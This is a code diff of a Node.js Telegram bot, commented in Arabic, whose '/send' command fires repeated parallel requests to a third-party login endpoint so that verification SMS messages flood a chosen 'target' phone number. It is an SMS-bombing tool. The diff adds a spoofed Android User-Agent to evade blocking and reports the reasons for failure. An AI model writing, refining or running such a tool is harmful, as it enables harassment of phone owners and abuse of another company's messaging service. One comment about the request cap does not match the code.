@@ -1,5 +1,4 @@
 const axios = require('axios');
-const crypto = require('crypto');
 
 // ==========================================
 // ⚙️ الإعدادات
@@ -32,14 +31,16 @@ function isRateLimited(userId) {
     return false; 
 }
 
-// دالة إرسال رسالة واحدة (تستخدم داخل التكرار)
+// دالة إرسال رسالة واحدة (مع إرجاع سبب الخطأ)
 async function sendSingleSMS(number) {
     const url = "https://api.twistmena.com/music/Dlogin/sendCode";
+    // استخدام User-Agent يحاكي هاتف أندرويد حقيقي
     const headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020)",
         "Accept": "application/json",
         "Content-Type": "application/json",
-        "Referer": "https://www.google.com"
+        "Host": "api.twistmena.com",
+        "Connection": "Keep-Alive"
     };
     const payload = { 
         "dial": number, 
@@ -47,10 +48,15 @@ async function sendSingleSMS(number) {
     };
 
     try {
-        const res = await axios.post(url, payload, { headers: headers, timeout: 3000 });
-        return res.status === 200; // ترجع true لو نجح
+        const res = await axios.post(url, payload, { headers: headers, timeout: 5000 });
+        if (res.status === 200) return { success: true, reason: "200 OK" };
+        return { success: false, reason: `Status ${res.status}` };
     } catch (e) {
-        return false; // ترجع false لو فشل
+        // التقاط رسالة الخطأ التفصيلية
+        let msg = e.message;
+        if (e.response) msg = `Status ${e.response.status}`; // مثلا 403 Forbidden
+        else if (e.request) msg = "Network Error (Blocked)";
+        return { success: false, reason: msg };
     }
 }
 
@@ -66,77 +72,56 @@ exports.handler = async function(event, context) {
 
         const chatId = body.message.chat.id;
         const text = body.message.text.trim();
-        const firstName = body.message.from.first_name;
 
-        // استثناء الأدمن من الحظر
+        // استثناء الأدمن
         if (String(chatId) !== ADMIN_ID && isRateLimited(chatId)) {
-            await axios.post(TELEGRAM_API, { chat_id: chatId, text: "⛔ تجاوزت الحد المسموح (20 طلب/ساعة)." });
+            await axios.post(TELEGRAM_API, { chat_id: chatId, text: "⛔ تجاوزت الحد المسموح." });
             return { statusCode: 200, body: "Rate Limited" };
         }
 
         let replyText = "";
 
-        // --- أمر الإرسال المتعدد (/send) ---
+        // --- أمر الإرسال (/send) ---
         if (text.startsWith("/send ")) {
             const parts = text.split(" ");
-            
-            // التحقق من الصيغة
             if (parts.length !== 3) {
-                replyText = "⚠️ **خطأ في الصيغة!**\nاكتب: `/send 01xxxxxxxxx 5`\n(العدد من 1 إلى 10)";
+                replyText = "⚠️ **خطأ!** اكتب: `/send 01xxxxxxxxx 1`";
             } else {
                 let number = parts[1];
                 let count = parseInt(parts[2]);
 
-                // ضبط الرقم المصري
                 if (number.startsWith("01")) number = "2" + number;
+                
+                // تقليل العدد إلى 3 للتجربة فقط لتفادي التايم أوت
+                if (count > 5) count = 5; 
 
-                // التحقق من العدد (من 1 لـ 10 فقط)
-                if (isNaN(count) || count < 1 || count > 10) {
-                    replyText = "⛔ **خطأ:** العدد يجب أن يكون بين 1 و 10 فقط.";
-                } else {
-                    // إرسال رسالة "جاري العمل"
-                    await axios.post(TELEGRAM_API, {
-                        chat_id: chatId, 
-                        text: `⏳ **جاري إرسال ${count} رسائل...**`
-                    });
+                await axios.post(TELEGRAM_API, { chat_id: chatId, text: `⏳ **جاري تجربة ${count} طلبات...**` });
 
-                    // تجهيز الطلبات للإرسال المتوازي (أسرع شيء)
-                    const promises = [];
-                    for (let i = 0; i < count; i++) {
-                        promises.push(sendSingleSMS(number));
-                    }
+                const promises = [];
+                for (let i = 0; i < count; i++) promises.push(sendSingleSMS(number));
 
-                    // انتظار النتائج
-                    const results = await Promise.all(promises);
-                    const successCount = results.filter(r => r === true).length;
-                    const failCount = count - successCount;
+                const results = await Promise.all(promises);
+                const successCount = results.filter(r => r.success).length;
+                const failCount = count - successCount;
+                
+                // جلب أول سبب للفشل لعرضه
+                const errorReason = results.find(r => !r.success)?.reason || "Unknown";
 
-                    replyText = `✅ **تم الانتهاء!**\n\n🎯 **الهدف:** \`${number}\`\n📤 **الناجح:** ${successCount}\n❌ **الفاشل:** ${failCount}`;
-                }
+                replyText = `📊 **تقرير التشخيص:**\n\n` +
+                            `🎯 **الهدف:** \`${number}\`\n` +
+                            `✅ **نجح:** ${successCount}\n` +
+                            `❌ **فشل:** ${failCount}\n` +
+                            `⚠️ **سبب الخطأ:** \`${errorReason}\``;
             }
         }
-
-        // --- الأوامر القديمة ---
         else if (text === "/start") {
-            replyText = `👮‍♂️ **أهلاً بك يا ${firstName}**\n\n🔥 **الأمر الجديد:**\nإرسال رسائل متعددة (ماكس 10):\n\`/send 01xxxxxxxxx 5\``;
-        }
-        else if (text.startsWith("/ip ")) {
-            // (كود IP القديم...)
-            replyText = "🌍 خاصية IP (مختصرة للكود)"; 
+            replyText = "👮‍♂️ **أهلاً بك.**\nجرب الأمر `/send` لترى سبب المشكلة التقنية.";
         }
         else {
-             replyText = "💡 **أوامر البوت:**\n1️⃣ فحص رقم: `/check 01xxxxxxxxx`\n2️⃣ إرسال متعدد: `/send 01xxxxxxxxx 5`";
+             replyText = "💡 الأمر: `/send 01xxxxxxxxx 1`";
         }
 
-        // إرسال الرد النهائي
-        if (replyText) {
-            await axios.post(TELEGRAM_API, {
-                chat_id: chatId,
-                text: replyText,
-                parse_mode: "Markdown"
-            });
-        }
-
+        if (replyText) await axios.post(TELEGRAM_API, { chat_id: chatId, text: replyText, parse_mode: "Markdown" });
         return { statusCode: 200, body: "OK" };
 
     } catch (e) {
